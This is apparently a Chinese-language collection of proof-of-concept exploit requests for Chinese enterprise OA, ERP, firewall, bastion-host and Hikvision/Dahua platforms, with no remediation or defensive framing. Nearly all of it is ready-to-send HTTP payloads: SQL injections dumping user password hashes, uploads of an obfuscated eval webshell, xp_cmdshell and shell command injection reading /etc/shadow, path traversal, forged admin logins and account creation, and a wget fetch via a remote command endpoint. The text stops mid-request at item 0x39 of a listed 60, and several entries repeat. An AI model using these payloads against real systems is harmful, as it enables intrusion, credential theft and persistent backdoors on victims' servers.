> ## **目录**
>
> 0x01 广联达OA SQL注入漏洞
>
> 0x02 广联达 Linkworks GetIMDictionarySQL 注入漏洞
>
> 0x03 广联达oa sql注入漏洞
>
> 0x04 广联达OA 后台文件上传漏洞
>
> 0x05 金和OA C6-GetSqlData.aspx SQL注入漏洞 POC
>
> 0x06 金和OA C6-GetSqlData.aspx SQL注入漏洞
>
> 0x07 金和OA C6-GetSqlData.aspx SQL注入漏洞
>
> 0x08 泛微E-Office9文件上传漏洞 CVE-2023-2523
>
> 0x09 泛微E-Office9文件上传漏洞(CVE-2023-2648 )
>
> 0x10 泛微 Weaver E-Office9 前台文件包含
>
> 0x11 泛微 E-Cology 某版本 SQL注入漏洞
>
> 0x12 泛微E-Office uploadify.php后台文件上传漏洞
>
> 0x13 泛微 HrmCareerApplyPerView SQL 注入漏洞
>
> 0x14 泛微 ShowDocsImage sql注入漏洞
>
> 0x15 红帆 OA 注入
>
> 0x16 红帆OA zyy_AttFile.asmx SQL注入漏洞
>
> 0x17 致远OA协同管理软件无需登录getshell
>
> 0x18 致远OA任意管理员登录
>
> 0x19 致远OA_V8.1SP2文件上传漏洞
>
> 0x20 宏景OA文件上传
>
> 0x21 明源云 ERP ApiUpdate.ashx 文件上传漏洞
>
> 0x22 天钥安全网关前台sql注入
>
> 0x23 汉得SRM tomcat.jsp 登录绕过漏洞
>
> 0x24 深信服应用交付系统存在RCE漏洞
>
> 0x25 深信服报表 版本有限制
>
> 0x26 深信服应用交付系统命令执行漏洞
>
> 0x27 深信服报表任意读取
>
> 0x28 飞企互联 FE 业务协作平台存在参数文件读取漏洞
>
> 0x29 Hytec Inter HWL-2511-SS popen.cgi存在命令注入漏洞
>
> 0x30 网神SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞
>
> 0x31 大华智慧园区综合管理平台 searchJson SQL注入漏洞
>
> 0x32 大华智慧园区综合管理平台 文件上传漏洞
>
> 0x33 绿盟SAS堡垒机GetFile任意文件读取漏洞
>
> 0x34 绿盟SAS堡垒机Exec远程命令执行漏洞
>
> 0x35 绿盟SAS堡垒机Exec远程命令执行漏洞
>
> 0x36 绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞
>
> 0x37 安恒明御运维审计与风险控制系统 xmlrpc.sock 任意用户添加漏洞
>
> 0x38 启明星辰-4A 统一安全管控平台 getMater 信息泄漏
>
> 0x39 用友移动管理系 统 uploadApk.do 任意文件上传漏洞
>
> 0x40 用友GRP-U8存在信息泄露
>
> 0x41 用友文件服务器认证绕过
>
> 0x42 用友时空KSOA PayBill SQL注入漏洞
>
> 0x43 用友畅捷通 T注入
>
> 0x44 契约锁电子签章系统 RCE
>
> 0x45 蓝凌EKP远程代码执行漏洞
>
> 0x46 禅道v18.0-v18.3后台命令执行
>
> 0x47 HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞
>
> 0x48 HiKVISION 综合安防管理平台 files 任意文件上传漏洞
>
> 0x49 HiKVISION 综合安防管理平台 report 任意文件上传漏洞
>
> 0x50 HIKVISION视频编码设备接入网关showFile.php任意文件下载
>
> 0x51 HiKVISION综合安防管理平台env信息泄漏
>
> 0x52 Nginx配置错误导致的路径穿越风险
>
> 0x53 Milesight VPN server.js 任意文件读取漏洞
>
> 0x54 PigCMS action_flashUpload 任意文件上传漏洞
>
> 0x55 金盘 微信管理平台 getsysteminfo 未授权访问漏洞
>
> 0x56 Panel loadfile 后台文件读取漏洞
>
> 0x57 网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞
>
> 0x58 Kuboard默认口令
>
> 0x59 金山EDR代码执行漏洞
>
> 0x60 企互联FE业务协作平台 ShowImageServlet 任意文件读取漏洞

# 0x01 **广联达OA SQL注入漏洞**

POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1

Host: xxx.com

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36

Accept: text/html,application/xhtml
xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Cookie:

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 88

dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from
T_ORG_USER --
# 0x02 **广联达 Linkworks GetIMDictionarySQL 注入漏洞**

POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1

Host:

Content-Type: application/x-www-form-urlencoded

key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
# 0x03 **广联达oa sql注入漏洞**

POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1

Host: xxx.com

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36

Accept: text/html,application/xhtml
xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Cookie:

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 88

dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from
T_ORG_USER --
# 0x04 **广联达OA 后台文件上传漏洞**

POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1

Host: 10.10.10.1:8888

X-Requested-With: Ext.basex

Accept: text/html, application/xhtml+xml, image/jxr, */*

Accept-Language: zh-Hans-CN,zh-Hans;q=0.5

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

Accept: */*

Origin: http://10.10.10.1

Referer:
http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&menuitemid=120743&frame=1&modulecode=GTP.Workflow.TaskCenterModule&tabID=40

Cookie:

Connection: close

Content-Length: 421

\------WebKitFormBoundaryFfJZ4PlAZBixjELj

Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"

Content-Type: application/text

<%@ Page Language="Jscript" Debug=true%>

<%

var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD';

var GFMA=Request.Form("qmq1");

var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);

eval(GFMA, ONOQ);

%>

\------WebKitFormBoundaryFfJZ4PlAZBixjELj--
# 0x05 **金和OA C6-GetSqlData.aspx SQL注入漏洞 POC**

POST /C6/Control/GetSqlData.aspx/.ashx

Host: ip:port

User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/35.0.2117.157 Safari/537.36

Connection: close

Content-Length: 189

Content-Type: text/plain

Accept-Encoding: gzip

exec master..xp_cmdshell 'ipconfig'

# 0x06 **金** **和OA C6-GetSqlData.aspx SQL注入漏洞**

POST /C6/Control/GetSqlData.aspx/.ashx

Host: ip:port

User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/35.0.2117.157 Safari/537.36

Connection: close

Content-Length: 189

Content-Type: text/plain

Accept-Encoding: gzip

exec master..xp_cmdshell 'ipconfig'

# 0x07 **金** **和OA C6-GetSqlData.aspx SQL注入漏洞**

POST /C6/Control/GetSqlData.aspx/.ashx

Host: ip:port

User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/35.0.2117.157 Safari/537.36

Connection: close

Content-Length: 189

Content-Type: text/plain

Accept-Encoding: gzip

exec master..xp_cmdshell 'ipconfig'

# 0x08 **泛微E-Office9文件上传漏洞 CVE-2023-2523**

POST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1

Host:192.168.233.10:8082

Cache-Control:max-age=0

Upgrade-Insecure-Requests:1

Origin:null

Content-Type:multipart/form-data;
boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt

Accept-Encoding:gzip, deflate

Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

Connection:close

\------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

Content-Disposition:form-data; name="upload_quwan"; filename="1.php."

Content-Type:image/jpeg

<?phpphpinfo();?>

\------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

# 0x09 **泛微E-Office9文件上传漏洞(CVE-2023-2648 )**

POST /inc/jquery/uploadify/uploadify.php HTTP/1.1

Host: 192.168.233.10:8082

User-Agent: test

Connection: close

Content-Length: 493

Accept-Encoding: gzip

Content-Type: multipart/form-data

\------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

Content-Disposition: form-data; name="Filedata"; filename="666.php"

Content-Type: application/octet-stream

<?php phpinfo();?>

\------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

# 0x10 **泛微 Weaver E-Office9 前台文件包含**

[http://URL/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls](http://URL/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls)

# 0x11 **泛微 E-Cology 某版本 SQL注入漏洞**

POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1

Host: ip:port

User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/35.0.2117.157 Safari/537.36

Connection: close

Content-Length: 189

Content-Type: text/plain

Accept-Encoding: gzip

callCount=1

page=

httpSessionId=

scriptSessionId=

c0-scriptName=DocDwrUtil

c0-methodName=ifNewsCheckOutByCurrentUser

c0-id=0

c0-param0=string:1 AND 1=1

c0-param1=string:1

batchId=0

# 0x12 **泛微E-Office uploadify.php后台文件上传漏洞**

POST /inc/jquery/uploadify/uploadify.php HTTP/1.1

Host:

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36

Connection: close

Content-Length: 259

Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4

Accept-Encoding: gzip

\--e64bdf16c554bbc109cecef6451c26a4

Content-Disposition: form-data; name="Filedata";
filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"

Content-Type: image/jpeg

<?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>

\--e64bdf16c554bbc109cecef6451c26a4--
路径

/attachment/3466744850/xxx.php

# 0x13 **泛微 HrmCareerApplyPerView SQL 注入漏洞**

GET
/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7
HTTP/1.1

Host: 127.0.0.1:7443

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML,like Gecko)

Accept-Encoding: gzip, deflate

Connection: close

# 0x14 **泛微 ShowDocsImage** **sql注入漏洞**

GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=* HTTP/1.1

Host: 127.0.0.1

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML,

like Gecko)

Accept-Encoding: gzip, deflate

Connection: close

# 0x15 **红帆** **OA** **注入**

POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1

Host: xxxxx

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML,

like Gecko) Version/12.0.3 Safari/605.1.15

Content-Length: 383

Content-Type: text/xml; charset=utf-8

Soapaction: "http://tempuri.org/GetFileAtt"

Accept-Encoding: gzip, deflate

Connection: close

<?xml version="1.0" encoding="utf-8"?><soap:Envelope

xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

xmlns:xsd="http://www.w3.org/2001/XMLSchema"

xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt

xmlns="http://tempuri.org/"><fileName>123</fileName></GetFileAtt>
</soap:Body></so

ap:Envelope>

# 0x16 **红帆OA zyy_AttFile.asmx SQL注入漏洞**

POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1

Host: 10.250.250.5

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML,

like Gecko) Version/12.0.3 Safari/605.1.15

Content-Length: 383

Content-Type: text/xml; charset=utf-8

Soapaction: "http://tempuri.org/GetFileAtt"

Accept-Encoding: gzip, deflate

Connection: close

<?xml version="1.0" encoding="utf-8"?><soap:Envelope

xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

xmlns:xsd="http://www.w3.org/2001/XMLSchema"

xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt

xmlns="http://tempuri.org/"><fileName>123</fileName></GetFileAtt>
</soap:Body></so

ap:Envelope>

# 0x17 **致远OA协同管理软件无需登录getshell**

访问:

ip/seeyon/htmlofficeservlet

如果出现下述所示内容，表示存在漏洞。

![1692946469_64e8502596236b962f395.png!small?1692946471067](https://image.3001.net/images/20230825/1692946469_64e8502596236b962f395.png!small?1692946471067)

Poc:

DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV

OPTION=S3WYOSWLBSGr

currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66

CREATEDATE=wUghPB3szB3Xwg66

RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6

originalFileId=wV66

originalCreateDate=wUghPB3szB3Xwg66

FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6

needReadFile=yRWZdAS6

originalCreateDate=wLSGP4oEzLKAz4=iz=66

webshell

# 0x18 **致远OA任意管理员登录**

POST /seeyon/thirdpartyController.do HTTP/1.1

method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1

# 0x19 **致远OA_V8.1SP2文件上传漏洞**

POST
/seeyou/ajax.do?method=ajaxAction&managerName=formulaManager&managerMethod=saveFormula4C1oud
HTTP/1.1

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

User-Agent: Cozilla/5.0 (Vindows Et 6.1; Sow64,rident/7.0; ry:11.0)

Accept-Encoding: gzip,deflate

Cookie:JSESSIONID=5bGx5rW35LmL5YWz

Cache-Control: no-cache

Content-Encoding: deflate

Pragma: no-cache

Host: 1.1.1.1

Accept: text/html，image/gif, image/jpeg，*; q=.2,*/*; q=.2

Content-Length:522729

Connection: close

X-Forwarded-For: 1.2.3.4

arguments={"formulaName":"test","formulaAlias":"safe_pre","formulaType":"2","formulaExpression":"","sample":"马子"}

# 0x20 **宏景OA文件上传**

POST
/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp
HTTP/1.1

Host: xx.xx.xx.xx

Cookie: JSESSIONID=C92F3ED039AAF958516349D0ADEE426E

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101
Firefox/111.0

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Content-Length: 417

DBSTEP V3.0 351 0 666 DBSTEP=REJTVEVQ

OPTION=U0FWRUZJTEU=

currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66

FILETYPE=Li5cMW5kZXguanNw

RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6

originalFileId=wV66

originalCreateDate=wUghPB3szB3Xwg66

FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6

needReadFile=yRWZdAS6

originalCreateDate=wLSGP4oEzLKAz4=iz=66

1

shell:http://xx.xx.xx.xx/1ndex.jsp

# 0x21 **明源云 ERP ApiUpdate.ashx 文件上传漏洞**

POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1Host:
target.comAccept-Encoding: gzipUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac
OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3
Safari/605.1.15Content-Length: 856

{{unquote("PK\x03\x04\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00../../../fdccloud/_/check.aspx$\xcc\xcb\x0a\xc20\x14\x04\xd0_\x09\x91B\xbb\x09\x0a\xddH\xab\x29\x8aP\xf0QZ\xc4\xf5m\x18j!ib\x1e\x82\x7fo\xc4\xdd0g\x98:\xdb\xb1\x96F\xb03\xcdcLa\xc3\x0f\x0b\xce\xb2m\x9d\xa0\xd1\xd6\xb8\xc0\xae\xa4\xe1-\xc9d\xfd\xc7\x07h\xd1\xdc\xfe\x13\xd6%0\xb3\x87x\xb8\x28\xe7R\x96\xcbr5\xacyQ\x9d&\x05q\x84B\xea\x7b\xb87\x9c\xb8\x90m\x28<\xf3\x0e\xaf\x08\x1f\xc4\xdd\x28\xb1\x1f\xbcQ1\xe0\x07EQ\xa5\xdb/\x00\x00\x00\xff\xff\x03\x00PK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00../../../fdccloud/_/check.aspxPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00L\x00\x00\x00\xc8\x00\x00\x00\x00\x00")}}vsoft=kvm&hostType=physical&name=penson&extranet=127.0.0.1%7Ccalc.exe&cpuCores=2&memory=16&diskSize=16&desc=&uid=640be59da4851&type=za

# 0x22 **天钥安全网关前台sql注入**

POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1

Host: ****

Connection: close

Cache-Control: max-age=0

sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"

sec-ch-ua-mobile: ?0

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Language: zh-CN,zh;q=0.9

Cookie: ****

Content-Type: application/x-www-form-urlencoded

Content-Length: 39

checkname=123&tagid=123

sqlmap -u "https://****/ops/index.php?c=Reportguide&a=checkrn" --data
"checkname=123&tagid=123" -v3 --skip-waf --random-agent

# 0x23 **汉得SRM tomcat.jsp 登录绕过漏洞**

/tomcat.jsp?dataName=role_id&dataValue=1

/tomcat.jsp?dataName=user_id&dataValue=1

然后访问后台：/main.screen

# 0x24 **深信服应用交付系统存在RCE漏洞**

POST/rep/login HTTP/1.1Host:
xxx.xxx.xxx.xxxCookie:UEDC_LOGIN_POLICY_VALUE=checkedContent-Length:124Sec-Ch-Ua:"Not/A)Brand";v="99", "Google Chrome";v=" 115",
"Chromium";v="115"Accept:*/*Content-Type:application/x-www-form-urlencoded;charset=UTF-8X-Requested-With:XMLHttpRequestSec-Ch-Ua-Mobile:?0User-Agent:Mozilla/5.0(Windows NT
10.0;Win64;*64)AppleWebKit/537.36(KHTML,like Gecko)Chrome/115.0.0.0
Safar/537.36Sec-Ch-Ua-Platform:"Windows"Origin:https://xxx.xxx.xxx.xxxSec-Fetch-Site:same-originSec-Fetch-Mode:corsSec-Fetch-Dest:emptyReferer:https://xxx.xxx.xxx.xxx/rep/loginAccept-Encoding:gzipdeflateAccept-Language:zh-CNzh;q=0.9Connection: cose

dsMode=ds_mode_login%0Awhoami%A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123

# 0x25 **深信服报表 版本有限制**

POST /rep/login HTTP/1.1

Host: URL

Cookie:

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15:
ry:109.0)Gecko/20100101 Firefox/115.0

Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif,
image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2

Accept-Encoding: gzip deflate

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te:
trailers

Connection: close

Content-Type:application/x-www-form-urlencoded

Content-Length: 126
clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid
-a %0A&userPsw=tmbhuisq

# 0x26 **深信服应用交付系统命令执行漏洞**

POST /rep/login

Host:10.10.10.1:85

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123

# 0x27 **深信服报表任意读取**

GET /report/download.php?pdf=../../../../../etc/passwd HTTP/1.1

Host: xx.xx.xx.xx:85

User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)

Accept: */*

Connection: Keep-Alive

# 0x28 **飞企互联 FE 业务协作平台存在参数文件读取漏洞**

/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print

# 0x29 **Hytec Inter HWL-2511-SS popen.cgi存在命令注入漏洞**

/cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/shadow&v=0.1303033443137921

# 0x30 **网神SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞**

POST /?g=obj_app_upfile HTTP/1.1

Host: x.x.x.x

Accept: */*

Accept-Encoding: gzip, deflate

Content-Length: 574

Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc

User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

\------WebKitFormBoundaryJpMyThWnAxbcBBQc

Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000

\------WebKitFormBoundaryJpMyThWnAxbcBBQc

Content-Disposition: form-data; name="upfile"; filename="vulntest.php"

Content-Type: text/plain

<?php php马?>

\------WebKitFormBoundaryJpMyThWnAxbcBBQc

Content-Disposition: form-data; name="submit_post"

obj_app_upfile

\------WebKitFormBoundaryJpMyThWnAxbcBBQc

Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445

\------WebKitFormBoundaryJpMyThWnAxbcBBQc--
马儿路径：attachements/xxx.php

# 0x31 **大华智慧园区综合管理平台 searchJson SQL注入漏洞**

GET
/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D
HTTP/1.1

Host: 127.0.0.1:7443

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

Accept-Encoding: gzip, deflate

Connection: close

# 0x32 **大华智慧园区综合管理平台 文件上传漏洞**

POST /publishing/publishing/material/file/video HTTP/1.1

Host: 127.0.0.1:7443

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

Content-Length: 804

Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7

Accept-Encoding: gzip, deflate

Connection: close

\--dd8f988919484abab3816881c55272a7

Content-Disposition: form-data; name="Filedata";
filename="0EaE10E7dF5F10C2.jsp"

<%@page contentType="text/html; charset=GBK"%><%@page
import="java.math.BigInteger"%><%@page
import="java.security.MessageDigest"%><% MessageDigest md5 = null;md5 =
MessageDigest.getInstance("MD5");String s = "123456";String miyao = "";String
jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String =
new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new
java.io.File(application.getRealPath(request.getServletPath())).delete();%>

\--dd8f988919484abab3816881c55272a7

Content-Disposition: form-data; name="poc"

poc

\--dd8f988919484abab3816881c55272a7

Content-Disposition: form-data; name="Submit"

submit

\--dd8f988919484abab3816881c55272a7--
# 0x33 **绿** **盟SAS堡垒机GetFile任意文件读取漏洞**

GET
/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
HTTP/1.1

Host: 1.1.1.1

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

Accept-Encoding: gzip, deflate

Connection: close

# 0x34 **绿** **盟SAS堡垒机Exec远程命令执行漏洞**

GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx HTTP/1.1

Host: 1.1.1.1

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

Content-Type: application/x-www-form-urlencoded

Accept-Encoding: gzip, deflate

Connection: close

# 0x35 **绿** **盟SAS堡垒机Exec远程命令执行漏洞**

/webconf/Exec/index?cmd=wget%20xxx.xxx.xxx

# 0x36 **绿** **盟 SAS堡垒机 local_user.php 任意用户登录漏洞**

GET
/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
HTTP/1.1

Host: 1.1.1.1

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

Accept-Encoding: gzip, deflate

Connection: close

# 0x37 **安** **恒明御运维审计与风险控制系统 xmlrpc.sock 任意用户添加漏洞**

POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc
HTTP/1.1

Host: 10.10.10.10

Cookie:

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

Content-Type: application/x-www-form-urlencoded

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Connection: close

<?xml version="1.0"?>

<methodCall>

<methodName>web.user_add</methodName>

<params>

<param>

<value>

<array>

<data>

<value>

<string>admin</string>

</value>

<value>

<string>5</string>

</value>

<value>

<string>10.10.10.10</string>

</value>

</data>

</array>

</value>

</param>

<param>

<value>

<struct>

<member>

<name>uname</name>

<value>

<string>test</string>

</value>

</member>

<member>

<name>name</name>

<value>

<string>test</string>

</value>

</member>

<member>

<name>pwd</name>

<value>

<string>ABC123!@#</string>

</value>

</member>

<member>

<name>authmode</name>

<value>

<string>1</string>

</value>

</member>

<member>

<name>deptid</name>

<value>

<string></string>

</value>

</member>

<member>

<name>email</name>

<value>

<string></string>

</value>

</member>

<member>

<name>mobile</name>

<value>

<string></string>

</value>

</member>

<member>

<name>comment</name>

<value>

<string></string>

</value>

</member>

<member>

<name>roleid</name>

<value>

<string>102</string>

</value>

</member>

</struct></value>

</param>

</params>

</methodCall>

# 0x38 **启明星辰-4A 统一安全管控平台 getMater 信息泄漏**

relative: req0

session: false

requests:

\- method: GET

timeout: 10

path: /accountApi/getMaster.do

headers:

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,

like Gecko) Chrome/65.0.881.36 Safari/537.36

follow_redirects: true

matches: (code.eq("200") && body.contains("\"state\":true"))

# 0x39 **用** **友移动管理系 统 uploadApk.do 任意文件上传漏洞**

POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1

Host:

Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server

Connection: close

